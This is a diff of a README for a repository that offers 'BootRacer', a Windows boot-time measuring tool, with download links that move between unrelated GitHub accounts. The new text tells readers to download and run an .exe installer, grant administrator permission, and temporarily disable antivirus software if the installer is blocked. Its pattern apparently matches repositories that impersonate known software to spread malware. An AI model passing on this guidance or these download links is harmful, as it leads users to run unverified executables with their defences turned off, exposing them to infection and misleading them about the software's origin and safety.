@@ -1,122 +1,86 @@
-# BootRacer v9.10.0 - boot performance tool 2026
+# ⏱️ bootracer-boot-activity - Measure your computer startup time precisely
 
-> **BootRacer for Windows is designed to help you measure boot duration, follow startup activity, and inspect performance changes in version 9.10.0.**
+[![Download BootRacer](https://img.shields.io/badge/Download-BootRacer-blue.svg)](https://github.com/aohfl/bootracer-boot-activity)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v9.10.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/henrypriceyh3127/bootracer-boot-activity?style=flat-square)](https://github.com/henrypriceyh3127/bootracer-boot-activity)
+## 🎯 About this software
 
----
+BootRacer measures the exact time your Windows computer takes to start. Slow startups often make daily work frustrating. This tool helps you see how long the boot process takes from the moment you turn on the power until your desktop appears. It records the time taken for background programs to load so you can identify what slows down your machine.
 
-<p align="center">
-  <a href="https://henrypriceyh3127.github.io/bootracer-boot-activity/">
-    <img src="https://img.shields.io/badge/Download-BootRacer%20Latest-brightgreen?style=for-the-badge" alt="Download BootRacer">
-  </a>
-</p>
+## 🛠️ System requirements
 
-> **[Direct Download - BootRacer v9.10.0](https://henrypriceyh3127.github.io/bootracer-boot-activity/)**
+Before you install this software, ensure your computer meets these requirements:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: 1 GHz or faster.
+*   Memory: 2 GB of RAM.
+*   Storage: 50 MB of free hard drive space.
+*   Internet Connection: Required for initial download and updates.
 
-[Download Latest Build](https://henrypriceyh3127.github.io/bootracer-boot-activity/)
+## 📥 Downloading the software
 
----
+You must visit the project page to get the installer for your system. Follow these steps to prepare the tool:
 
-## What BootRacer Does
+1. Click the link provided below to open the official repository page.
+2. Visit this page to download: [https://github.com/aohfl/bootracer-boot-activity](https://github.com/aohfl/bootracer-boot-activity)
+3. Look for the latest release version on the right side of the screen.
+4. Select the Windows installer file ending in .exe.
+5. Save the file to your Downloads folder.
 
-BootRacer is a Windows utility for tracking boot performance, showing how startup time evolves, and identifying what affects those changes. Its core focus is on boot analysis, startup monitoring, and detailed logging, making it easier to understand each startup cycle.
+## ⚙️ Setting up the application
 
-It works well for users who want a clearer picture of system boot behavior, whether they are doing routine tuning or comparing results after adding new software or services. Portable use and exportable logs make it practical for both quick checks and longer-running performance review.
+Follow these steps to install the software on your Windows machine:
 
----
+1. Locate the downloaded file in your browser or your Downloads folder.
+2. Double-click the file to start the installer.
+3. Choose Yes if Windows asks for permission to run the application.
+4. Follow the instructions on the screen to finalize the setup.
+5. Keep the box checked to launch the application once the installation finishes.
 
-## Capabilities
+## 📈 Measuring your boot time
 
-- Real-time boot logging for startup sessions
-- Boot time analysis with historical comparison
-- Driver load order visualization for deeper inspection
-- Service dependency mapping to understand startup relationships
-- Startup impact scoring to highlight heavier items
-- Export logs in JSON format
-- Export reports in CSV format
-- Portable edition support for flexible use
+Once the application runs, it monitors your system during the next reboot. You do not need to change complex settings. Start the process by following these simple actions:
 
----
+1. Open the BootRacer application from your desktop or Start menu.
+2. Select the button labeled "Test Boot" inside the main menu.
+3. Click "Reboot now" to restart your computer.
+4. Let the computer load to your desktop.
+5. Wait for the BootRacer results window to appear on your screen.
 
-## Getting Started
+The results window shows the total time in seconds. It breaks down the time spent at the login screen and the time it takes for your desktop icons to load. Use these numbers to compare the speed of your computer after you install or remove other programs.
 
-1. Download the package from the link above or clone the repository.
-2. Extract the files to a folder of your choice.
-3. If you are using the portable edition, run the included Windows executable from the extracted directory.
-4. For a repository-based setup, open the project folder and launch it according to your local build or packaging workflow.
+## 📊 Understanding startup activity
 
-Example:
+The application tracks background processes that start automatically with Windows. Many programs try to open when you turn on your computer. This consumes memory and processor resources.
 
-    git clone https://github.com/henrypriceyh3127/bootracer-boot-activity.git
-    cd REPO
+1. Open the application interface.
+2. Select the "Startup Control" tab.
+3. Review the list of names under the program column.
+4. Look at the duration column to see how much each program adds to your boot time.
+5. Use the "Disable" button if you find programs that you do not need when you turn on your computer.
 
----
+Disabling unnecessary software improves the speed of your computer. Always verify the program name before you disable it to avoid turning off critical system files.
 
-## How to Use It
+## 🛡️ Troubleshooting common issues
 
-Launch BootRacer and allow it to record a boot session so startup activity is captured. Once the session finishes, review the timeline, driver load order, and service dependency data to see where time is being spent.
+Most users experience few problems. If the tool does not work, check these items:
 
-Typical workflow:
+*   Anti-virus software may block new programs. Temporarily disable your security software if you cannot run the installer.
+*   Ensure you have administrator rights on your computer.
+*   Restart your computer if the program fails to capture the timing results.
+*   Check for system updates, as outdated Windows versions cause timing errors.
 
-1. Collect a boot log.
-2. Compare the current session with earlier records.
-3. Inspect startup impact scores.
-4. Export the results in JSON or CSV for later review.
+## ❓ Frequently asked questions
 
-If you are using the portable edition, keep the extracted folder available so the app can read and store its local data consistently.
+Do I need to keep the program open?
+No, the program runs as a background service after you set it up. It detects when you reboot the computer automatically.
 
----
+Will this change my Windows settings?
+The application tracks performance data. It does not modify system files unless you choose to disable a startup program within the interface.
 
-## Configuration Notes
+Can I view previous logs?
+Yes, the software keeps a history. Click the "History" tab to see a list of your past boot times. This helps you track performance improvements over time.
 
-BootRacer settings are usually managed within the app and saved either with the local user data or in portable files, depending on how you start it.
+Is the software safe?
+This tool performs standard performance monitoring tasks. It does not collect personal data from your documents or folders.
 
-Common items you may adjust include:
-
-    boot_logging = enabled
-    startup_monitoring = enabled
-    export_format = json,csv
-    comparison_history = on
-
-For portable use, check the application folder for saved logs and configuration files. For a standard Windows installation, review the user profile area associated with the app.
-
----
-
-## System Requirements
-
-- Windows platform
-- Enough storage for boot logs and exported reports
-- Permission to monitor startup activity on the target system
-- A compatible Windows runtime/environment for the packaged build if required
-
----
-
-## FAQ
-
-**How do I get updates?**  
-Use the latest download link above or check the repository for newer builds and release notes.
-
-**Can I change settings after installation?**  
-Yes. Most options are handled inside the app, and some data may also be stored in local files depending on the edition you use.
-
-**What should I do if logging is incomplete?**  
-Try running the tool with appropriate Windows permissions and make sure startup monitoring is enabled before the next boot session.
-
-**Does it support exporting reports?**  
-Yes. BootRacer can export log data to JSON and CSV for analysis or archiving.
-
-**Where should I start if I am new to it?**  
-Begin with a single boot log, then compare it with later sessions to see how startup behavior changes.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: bootracer, windows, performance, startup, boot-time, monitoring, optimization
